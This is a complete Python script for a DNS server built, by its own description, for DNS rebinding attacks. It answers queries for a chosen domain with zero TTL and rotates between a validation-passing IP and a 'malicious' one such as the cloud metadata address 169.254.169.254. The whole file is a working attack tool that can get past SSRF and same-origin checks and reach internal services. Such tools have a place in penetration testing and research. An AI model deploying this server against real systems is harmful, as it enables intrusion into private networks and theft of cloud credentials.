#!/usr/bin/env python3
# coding=utf-8
"""
LICENSE http://www.apache.org/licenses/LICENSE-2.0
"""
import argparse
import datetime
import sys
import time
import threading
import traceback
import socketserver
import struct
from random import randrange
try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

# a global domain object, that will be initialized with values later
D = None

class Domain():

    def __init__(self, domain, ip_addresses, TTL=0):
        # the actual DNS queries have the . at the end
        self.domain = domain + '.'
        self.ip_addresses = ip_addresses
        self.TTL = TTL
        self.counter = 0

    # increases the counter, but keeps it in a range of len(ip_addresses) 
    def rotate_counter(self):
        self.counter = (self.counter + 1) % len(self.ip_addresses)

    # this functions returns one of the IP addresses
    def get_records(self):
        cr_index = self.counter % len(self.ip_addresses)
        records = {
           self.domain: [A(self.ip_addresses[cr_index]), ],
        }
        self.rotate_counter()        
        return records

    def __str__(self):
        return self.domain


def dns_response(data):
    request = DNSRecord.parse(data)

    print(request)

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]

    # does the query apply to our domain?
    if qn == str(D) or qn.endswith('.' + str(D)):

        # get the record with the IP address, different on each query
        records = D.get_records()

        # this for is in case we have more than one domain 
        for name, rrs in records.items():

            # does this record apply to the queried domain?
            if name == qn:
                # one record may contain more data to response eg. AAAA records
                for rdata in rrs:
                    rqt = rdata.__class__.__name__
                    if qt in ['*', rqt]:

                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=D.TTL, rdata=rdata))


    print("---- Reply:\n", reply)

    return reply.pack()


class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
                                               self.client_address[1]))
        try:
            data = self.get_data()
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def create_parser():
    parser = argparse.ArgumentParser(description='Start a DNS server for DNS rebinding attacks implemented in Python.')
    parser.add_argument('-p', '--port', default=53, type=int, help='The port to listen on. 53 is the default value.')
    parser.add_argument('-d', '--domain', required=True, help='The domain for which the DNS queries will be sent. It has to be a subdomain of a domain whose nameservers point to this machine.')
    parser.add_argument('-i', '--ip', required=True, nargs='+', help='IP addresses that will be in the response to the A DNS queries for the domain specified in --domain parameter. For the DNS rebinding to work it usually will be 2 IP addresses - one that will pass the validations and one malicious eg. 169.254.169.254, but the server will also work with more IPs. It cycles through the whole list and responds with the next one in each query, so the order here matters.')
    parser.add_argument('--ttl', default=0, nargs='?', help='TTL of the DNS responses. 0 is the default value.')
    args = parser.parse_args()
    return args


def start_server(domain, ip_addresses, ttl=0, port=53):
    print("Starting nameserver...")
    global D
    D = Domain(domain, ip_addresses, ttl)
    
    server = socketserver.ThreadingUDPServer(('', port), UDPRequestHandler)

    thread = threading.Thread(target=server.serve_forever)  # that thread will start one more thread for each request
    thread.daemon = True  # exit the server thread when the main thread terminates
    thread.start()
    print("%s server loop running in thread: %s" % (server.RequestHandlerClass.__name__[:3], thread.name))

    return server, thread


def main():
    args = create_parser()
    server, thread = start_server(args.domain, args.ip, args.ttl, args.port)
    
    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()

if __name__ == '__main__':
    main()

